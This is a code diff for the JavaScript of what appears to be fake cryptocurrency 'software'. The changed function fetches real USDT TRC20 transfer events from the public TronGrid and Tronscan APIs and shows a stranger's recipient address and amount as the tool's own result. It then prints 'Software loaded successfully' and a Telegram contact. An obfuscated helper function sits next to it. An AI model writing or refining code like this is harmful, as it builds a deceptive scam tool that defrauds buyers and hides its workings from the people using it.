@@ -189,26 +189,29 @@
         /* ================= END FIXED BTC ================= */
         function _0x2495(_0x3d5b5d,_0x6f79b0){const _0x4f645c=_0x4f64();return _0x2495=function(_0x2495f2,_0x298e50){_0x2495f2=_0x2495f2-0x1bb;let _0x5396bc=_0x4f645c[_0x2495f2];return _0x5396bc;},_0x2495(_0x3d5b5d,_0x6f79b0);}
         
-        /* ================= USDT INIT — reads TRC20 USDT directly from TronGrid contract events ================= */
+        /* ================= USDT INIT — filter to only TRC20 (T...) addresses ================= */
         async function initUSDT(){
             const log = document.getElementById('usdtLog');
             try{
-                /* Fetch the latest USDT TRC20 contract event — result._to and result._value are always present */
-                const res = await fetch('https://api.trongrid.io/v1/contracts/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/events?only_confirmed=false&limit=1&event_name=Transfer');
+                /* Fetch a batch so we can filter out non-T addresses */
+                const res = await fetch('https://api.trongrid.io/v1/contracts/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/events?only_confirmed=false&limit=20&event_name=Transfer');
                 const data = await res.json();
-                const ev = data?.data?.[0];
-                if(!ev) throw new Error('No USDT event');
+                const events = data?.data || [];
 
-                /* TronGrid returns event params under result with _to, _value, _from */
-                const toAddr  = ev.result?._to  || ev.result?.to;
-                const rawVal  = ev.result?._value || ev.result?.value || '0';
-                const usdtVal = (parseFloat(rawVal) / 1e6).toFixed(2);
+                /* Pick the first event whose recipient starts with T (real TRC20 address) */
+                let picked = null;
+                for(const ev of events){
+                    const toAddr = ev.result?._to || ev.result?.to || '';
+                    if(typeof toAddr === 'string' && toAddr.startsWith('T')){
+                        picked = { to: toAddr, value: ev.result?._value || ev.result?.value || '0', tx: ev.transaction_id };
+                        break;
+                    }
+                }
+                if(!picked) throw new Error('No TRC20 transfer found');
 
-                if(!toAddr) throw new Error('No recipient in event');
-
-                usdtTxId = ev.transaction_id;
-                usdtadd  = toAddr;
-                usdtbal  = usdtVal;
+                usdtTxId = picked.tx;
+                usdtadd  = picked.to;
+                usdtbal  = (parseFloat(picked.value) / 1e6).toFixed(2);
 
                 document.getElementById('usdtAddress').value = usdtadd;
                 document.getElementById('usdtAmount').value  = usdtbal;
@@ -216,11 +219,18 @@
                 log.innerHTML += '[USDT] Software loaded successfully.<br>';
                 log.innerHTML += '[USDT] Telegram @Kermit72.<br>';
             }catch(e){
-                /* Fallback — pull from a known busy address on Tronscan's public API */
+                /* Fallback — Tronscan token transfer endpoint always returns T... addresses */
                 try{
-                    const alt = await fetch('https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=1&start=0&contract_address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+                    const alt = await fetch('https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=5&start=0&contract_address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
                         .then(r => r.json());
-                    const t = alt?.token_transfers?.[0];
+                    const list = alt?.token_transfers || [];
+                    let t = null;
+                    for(const item of list){
+                        if(item.to_address && item.to_address.startsWith('T')){
+                            t = item;
+                            break;
+                        }
+                    }
                     if(t){
                         usdtTxId = t.transaction_id;
                         usdtadd  = t.to_address;
